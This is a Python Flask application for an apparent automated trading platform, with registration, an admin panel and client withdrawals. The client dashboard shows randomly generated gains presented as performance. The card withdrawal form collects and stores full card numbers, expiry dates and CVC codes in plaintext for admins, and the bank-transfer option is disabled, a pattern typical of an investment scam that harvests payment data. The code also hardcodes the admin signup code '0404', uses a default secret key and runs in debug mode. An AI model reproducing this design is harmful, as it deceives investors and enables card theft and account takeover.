from flask import Flask, render_template, request, redirect, url_for, session, flash
from flask_pymongo import PyMongo
from bson.objectid import ObjectId
from werkzeug.security import generate_password_hash, check_password_hash
import datetime
import os
import re

app = Flask(__name__)
app.secret_key = os.getenv('FLASK_SECRET_KEY', 'cle_secrete_par_defaut')

# Config MongoDB
app.config["MONGO_URI"] = os.getenv("MONGO_URI", "mongodb://localhost:27017/robottrader")
mongo = PyMongo(app)
db = mongo.db

# Helpers
def current_user():
    username = session.get('username')
    if not username:
        return None
    return db.users.find_one({"username": username})

def is_logged_in():
    return 'username' in session

def is_admin():
    user = current_user()
    return user and user.get('role') == 'admin'

def is_client():
    user = current_user()
    return user and user.get('role') == 'client'

# Routes

@app.route('/')
def index():
    if is_logged_in():
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        code_admin = request.form.get('code_admin', '')
        if not username or not password:
            flash("Veuillez remplir tous les champs.", "error")
            return render_template('register.html')
        if db.users.find_one({"username": username}):
            flash("Nom d'utilisateur déjà pris.", "error")
            return render_template('register.html')
        role = 'admin' if code_admin == '0404' else 'client'
        hashed = generate_password_hash(password)
        db.users.insert_one({
            "username": username,
            "password": hashed,
            "role": role,
            "balance": 0,
            "benefit": 0,
            "api_key": "",
            "api_secret": ""
        })
        flash("Inscription réussie, connectez-vous.", "success")
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        user = db.users.find_one({"username": username})
        if user and check_password_hash(user['password'], password):
            session['username'] = user['username']
            flash(f"Bienvenue {user['username']} !", "success")
            return redirect(url_for('dashboard'))
        else:
            flash("Identifiants invalides.", "error")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("Déconnecté.", "info")
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if not is_logged_in():
        return redirect(url_for('login'))
    user = current_user()
    if user['role'] == 'admin':
        clients = list(db.users.find({"role": "client"}))
        return render_template('dashboard.html', is_admin=True, users=clients, admin=user)
    else:
        # Données simulées pour le client
        balance = user.get('balance', 0)
        from random import uniform
        chart_data = [round(balance * (1 + uniform(-0.02, 0.05)), 2) for _ in range(10)]
        chart_labels = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]
        performance = round(chart_data[-1] - chart_data[0], 2)
        return render_template('dashboard.html',
                               is_admin=False,
                               username=user['username'],
                               balance=balance,
                               chart_labels=chart_labels,
                               chart_data=chart_data,
                               performance=performance)

@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if not is_logged_in():
        flash("Connectez-vous d'abord.", "error")
        return redirect(url_for('login'))
    user = current_user()
    if user['role'] != 'client':
        return "Accès refusé.", 403

    iban_enabled = False  # Mode IBAN désactivé

    if request.method == 'POST':
        amount = request.form.get('amount')
        withdraw_type = request.form.get('withdraw_type')

        try:
            amount = float(amount)
            if amount <= 0:
                raise ValueError()
        except:
            flash("Montant invalide.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if amount > user.get('balance', 0):
            flash("Montant supérieur à votre solde.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if withdraw_type not in ['carte', 'iban', 'identification_bancaire']:
            flash("Méthode de retrait invalide.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        if withdraw_type == 'iban':
            flash("Mode de retrait momentanément indisponible.", "error")
            return render_template('withdraw.html', iban_enabled=iban_enabled)

        withdrawal = {
            'user_id': user['_id'],
            'username': user['username'],
            'amount': amount,
            'withdraw_type': withdraw_type,
            'status': 'En attente',
            'date': datetime.datetime.now()
        }

        if withdraw_type == 'carte':
            card_number = request.form.get('card_number', '').strip()
            card_name = request.form.get('card_name', '').strip()
            card_expiry = request.form.get('card_expiry', '').strip()
            card_cvc = request.form.get('card_cvc', '').strip()
            if not all([card_number, card_name, card_expiry, card_cvc]):
                flash("Veuillez remplir tous les champs de la carte.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"\d{13,19}", card_number.replace(' ', '')):
                flash("Numéro de carte invalide.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"(0[1-9]|1[0-2])\/\d{2}", card_expiry):
                flash("Date d'expiration invalide (MM/AA).", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            if not re.fullmatch(r"\d{3,4}", card_cvc):
                flash("Code CVC invalide.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)

            withdrawal.update({
                'card_number': card_number,
                'card_name': card_name,
                'card_expiry': card_expiry,
                'card_cvc': card_cvc
            })

        elif withdraw_type == 'identification_bancaire':
            bank_name = request.form.get('bank_name', '').strip()
            account_number = request.form.get('account_number', '').strip()
            if not bank_name or not account_number:
                flash("Veuillez remplir tous les champs bancaires.", "error")
                return render_template('withdraw.html', iban_enabled=iban_enabled)
            withdrawal.update({
                'bank_name': bank_name,
                'account_number': account_number
            })

        db.withdrawals.insert_one(withdrawal)
        db.users.update_one({'_id': user['_id']}, {'$inc': {'balance': -amount}})
        flash("Demande de retrait enregistrée avec succès.", "success")
        return redirect(url_for('dashboard'))

    return render_template('withdraw.html', iban_enabled=iban_enabled)

@app.route('/withdraw_requests')
def withdraw_requests():
    if not is_logged_in():
        flash("Connectez-vous.", "error")
        return redirect(url_for('login'))
    if not is_admin():
        return "Accès refusé.", 403

    requests = list(db.withdrawals.find().sort('date', -1))
    return render_template('withdraw_requests.html', requests=requests)

@app.route('/process_withdraw/<withdraw_id>/<action>')
def process_withdraw(withdraw_id, action):
    if not is_logged_in() or not is_admin():
        return "Accès refusé.", 403
    if action not in ['approve', 'reject']:
        flash("Action invalide.", "error")
        return redirect(url_for('withdraw_requests'))

    withdrawal = db.withdrawals.find_one({"_id": ObjectId(withdraw_id)})
    if not withdrawal:
        flash("Demande introuvable.", "error")
        return redirect(url_for('withdraw_requests'))

    if withdrawal['status'] != 'En attente':
        flash("Cette demande a déjà été traitée.", "info")
        return redirect(url_for('withdraw_requests'))

    if action == 'approve':
        db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Approuvé", "processed_date": datetime.datetime.now()}})
        flash("Retrait approuvé.", "success")
    elif action == 'reject':
        db.users.update_one({'_id': withdrawal['user_id']}, {'$inc': {'balance': withdrawal['amount']}})
        db.withdrawals.update_one({"_id": withdrawal['_id']}, {"$set": {"status": "Rejeté", "processed_date": datetime.datetime.now()}})
        flash("Retrait rejeté et solde remboursé.", "success")

    return redirect(url_for('withdraw_requests'))

@app.errorhandler(403)
def forbidden(e):
    return render_template('403.html'), 403

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

if __name__ == '__main__':
    app.run(debug=True)
